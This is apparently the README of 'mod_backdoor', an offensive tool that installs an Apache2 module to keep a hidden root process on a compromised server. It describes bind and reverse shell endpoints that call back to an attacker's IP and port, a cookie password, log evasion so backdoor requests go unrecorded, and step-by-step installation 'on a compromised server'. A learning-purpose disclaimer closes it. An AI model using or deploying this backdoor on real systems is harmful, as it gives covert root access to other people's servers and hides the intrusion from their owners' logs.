# Apache2 mod_backdoor

mod_backdoor is a stealth backdoor using an Apache2 module.<br/>
The main idea is to fork() the main Apache2 process just after it has loaded its config.
Since it's forked before the root user transfers the process to www-data, you can execute command as root.<br/>
As Apache2 loads its configuration only when you (re)start it, the challenge was to never let die this 
forked root apache2 process, to let us interact as root with the compromised system.

# Features

* Bind TTY Shell
* Reverse Shell (TTY , Native, PHP, Perl, Python, Ruby)
* High stability and reliability, each shell spawns a new forked independent root process attached to PID 1
* Socks5 proxy
* Password Protection through cookie headers
* Ping module to know if its still active

There is also a hook to bypass the Apache2 logging mechanism. Each request to the backdoor module **are not logged** by Apache2.

# Demo
[![asciicast](https://asciinema.org/a/mOzJ74TmXJ5IZ5u48rDFx7MqQ.svg)](https://asciinema.org/a/mOzJ74TmXJ5IZ5u48rDFx7MqQ)

# Description

* The password is send through Cookie headers: `Cookie: password=backdoor`. It's defined with `#define` 
in the beginning of mod_backdoor.c, so you could easily edit it.<br/>

* Each following requests must contain this password to interact with the module.<br/>
* Each request containing this cookie **will not be logged by Apache** if the module is running. <br/>

* Each shell spawns **attached to PID** 1 and **is removed from apache2 cgroup**.
 It means it's possible to **restart/stop apache2.service from a spawned shell** (not true for 
 TTY shells because I need an apache2 process to do the bidirectional communication between socket
 and pty). It also improves stealth, shells are no longer related to apache2.service. <br/>

### Bind TTY Shell
The endpoint  `http[s]://<TARGET>/bind/<PORT>` binds a listening port on `<TARGET>:<PORT>` <br/>
When a connection is initiated to the listening port, the port closes. <br/>
`forkpty()` is used to obtain a native TTY shell, working with an IPC UNIX socket to communicate 
between forked TTY process and the new socket you just opened.<br/>
Shells could be easily upgraded with the famous trick:<br/>
 `CTRL-Z --> stty raw -echo --> fg --> reset`

### Reverse TTY Shell
It works like the bind shell, the endpoint `http[s]://<TARGET>/revtty/<IP>/<PORT>` returns a TTY
shell to `<IP>:<PORT>` <br/>


### Reverse Shell (No TTY)
The endpoint `http[s]://<TARGET>/reverse/<IP>/<PORT>/<PROG>` returns a shell to `<IP>:<PORT>`. <br/>
`<PROG>` must be one of these: <br/>

| Native   | External  |    
| :------: | :--------:|
|   sh     |    php    |
|   bash   |    python |
|   dash   |    ruby   |
|   ash    |    perl   |
|   tcsh   |           |
|   ksh    |           |

`<PROG>` must be in lower-case.<br/>
PHP uses the `exec` function.<br/>
Ruby isn't using `/bin/sh`.

### Socks5 proxy
TODO

### Ping module
The endpoint `http[s]://<TARGET>/ping` tells you if the module is currently working.

# Notes
Apache2 Module Backdoor is inspired from Ringbuilder, created by Juan Manuel Fernandez ([@TheXC3LL](https://twitter.com/TheXC3LL))<br/>
More info about Ringbuilder:<br/>
https://github.com/TarlogicSecurity/mod_ringbuilder <br/>
https://www.tarlogic.com/en/blog/backdoors-modulos-apache/ <br/>

Socks5 code was adapted from https://github.com/fgssfgss/socks_proxy <br/>
<br/>
Special thanks to [@Ug_0Security](https://twitter.com/Ug_0Security)

# Builds
For development :<br/>
* `apxs -i -a -c mod_backdoor.c -Wl,-lutil` <br/>
 -Wl,-lutil used to link mod_backdoor.so with libutil.so to use forkpty() from <pty.h>
* `systemctl restart apache2`

On a compromised server :<br/>
* Compile it for the desired arch and retrieve the mod_backdoor.so or<br/>
get it from the `build/` folder (compiled for: Apache/2.4.41 (Debian)).
* Copy mod_backdoor.so to `/usr/lib/apache2/modules/mod_backdoor.so`
* Copy backdoor.load to `/etc/apache2/mod-available/backdoor.load`
* `a2enmod backdoor` --> `systemctl restart apache2`

# Author
Vlad Rico ([@RicoVlad](https://twitter.com/RicoVlad))

## Disclaimer
This project was created only for learning purpose.<br/>
Usage of mod_backdoor for attacking targets without prior mutual consent is illegal. 
It is the end user's responsibility to obey all applicable local, state and federal laws. 
Developers assume no liability and are not responsible for any misuse or damage caused by this program.
